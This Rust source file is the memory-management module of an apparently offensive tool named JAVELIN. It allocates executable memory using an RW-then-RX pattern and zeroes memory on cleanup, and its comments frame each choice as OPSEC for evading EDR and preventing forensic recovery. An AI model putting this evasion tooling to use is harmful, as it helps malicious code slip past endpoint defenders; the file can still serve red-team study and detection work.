//! Memory management for JAVELIN
//!
//! Handles allocation, protection transitions, and cleanup
//! Uses indirect syscalls via dinvk for EDR evasion

use std::error::Error;

#[cfg(target_os = "windows")]
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
#[cfg(target_os = "windows")]
use winapi::um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};

/// Memory region handle for cleanup
pub struct MemoryRegion {
    address: *mut u8,
    size: usize,
}

impl MemoryRegion {
    /// Creates a new memory region handle
    pub fn new(address: *mut u8, size: usize) -> Self {
        Self { address, size }
    }

    /// Gets the base address of the region
    pub fn address(&self) -> *mut u8 {
        self.address
    }

    /// Gets the size of the region
    pub fn size(&self) -> usize {
        self.size
    }
}

impl Drop for MemoryRegion {
    /// Automatically frees memory when the region goes out of scope
    fn drop(&mut self) {
        #[cfg(target_os = "windows")]
        unsafe {
            if !self.address.is_null() {
                VirtualFree(self.address as *mut _, 0, MEM_RELEASE);
            }
        }
    }
}

/// Allocates memory as RW (PAGE_READWRITE)
///
/// **OPSEC**: Allocating as RW first is less suspicious than direct RWX
///
/// # Arguments
///
/// * `size` - Size in bytes to allocate
///
/// # Returns
///
/// * `Ok(MemoryRegion)` - Successfully allocated memory region
/// * `Err(_)` - Allocation failed
#[cfg(target_os = "windows")]
pub fn allocate_rw(size: usize) -> Result<MemoryRegion, Box<dyn Error>> {
    unsafe {
        let addr = VirtualAlloc(
            std::ptr::null_mut(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if addr.is_null() {
            return Err("VirtualAlloc failed".into());
        }

        Ok(MemoryRegion::new(addr as *mut u8, size))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn allocate_rw(_size: usize) -> Result<MemoryRegion, Box<dyn Error>> {
    // Use libc mmap for non-Windows platforms
    Err("Non-Windows allocation not yet implemented".into())
}

/// Transitions memory from RW to RX (PAGE_EXECUTE_READ)
///
/// **OPSEC**: RW → RX transition is standard practice and less suspicious than RWX
///
/// # Arguments
///
/// * `region` - Memory region to transition
///
/// # Returns
///
/// * `Ok(())` - Protection changed successfully
/// * `Err(_)` - Protection change failed
#[cfg(target_os = "windows")]
pub fn transition_rx(region: &MemoryRegion) -> Result<(), Box<dyn Error>> {
    unsafe {
        let mut old_protect = 0u32;
        let result = VirtualProtect(
            region.address() as *mut _,
            region.size(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if result == 0 {
            return Err("VirtualProtect failed".into());
        }

        Ok(())
    }
}

#[cfg(not(target_os = "windows"))]
pub fn transition_rx(_region: &MemoryRegion) -> Result<(), Box<dyn Error>> {
    Err("Non-Windows memory protection not yet implemented".into())
}

/// Allocates memory as RWX (PAGE_EXECUTE_READWRITE) - Less OPSEC friendly
///
/// **Note**: Direct RWX allocation is more suspicious and may trigger alerts
/// Prefer allocate_rw() + transition_rx() instead
///
/// This function exists for compatibility but should be avoided in production
#[cfg(target_os = "windows")]
pub fn allocate_rwx(size: usize) -> Result<MemoryRegion, Box<dyn Error>> {
    use winapi::um::winnt::PAGE_EXECUTE_READWRITE;

    unsafe {
        let addr = VirtualAlloc(
            std::ptr::null_mut(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if addr.is_null() {
            return Err("VirtualAlloc RWX failed".into());
        }

        Ok(MemoryRegion::new(addr as *mut u8, size))
    }
}

#[cfg(not(target_os = "windows"))]
pub fn allocate_rwx(_size: usize) -> Result<MemoryRegion, Box<dyn Error>> {
    Err("Non-Windows allocation not yet implemented".into())
}

/// Cleans up and zeros memory before freeing
///
/// **OPSEC**: Zeroing memory prevents forensic recovery of sensitive data
///
/// # Arguments
///
/// * `region` - Memory region to clean up
pub fn cleanup_memory(region: &MemoryRegion) {
    unsafe {
        // Zero out the memory
        let slice = std::slice::from_raw_parts_mut(region.address(), region.size());
        crate::crypto::secure_zero(slice);
    }
    // Memory will be freed when MemoryRegion is dropped
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(target_os = "windows")]
    fn test_allocate_and_transition() {
        // Allocate 4KB as RW
        let region = allocate_rw(4096).expect("Failed to allocate memory");
        
        // Write some data
        unsafe {
            let slice = std::slice::from_raw_parts_mut(region.address(), 10);
            slice.copy_from_slice(b"test data!");
        }
        
        // Transition to RX
        transition_rx(&region).expect("Failed to transition to RX");
        
        // Verify we can still read
        unsafe {
            let slice = std::slice::from_raw_parts(region.address(), 10);
            assert_eq!(slice, b"test data!");
        }
        
        // Cleanup
        cleanup_memory(&region);
    }
}
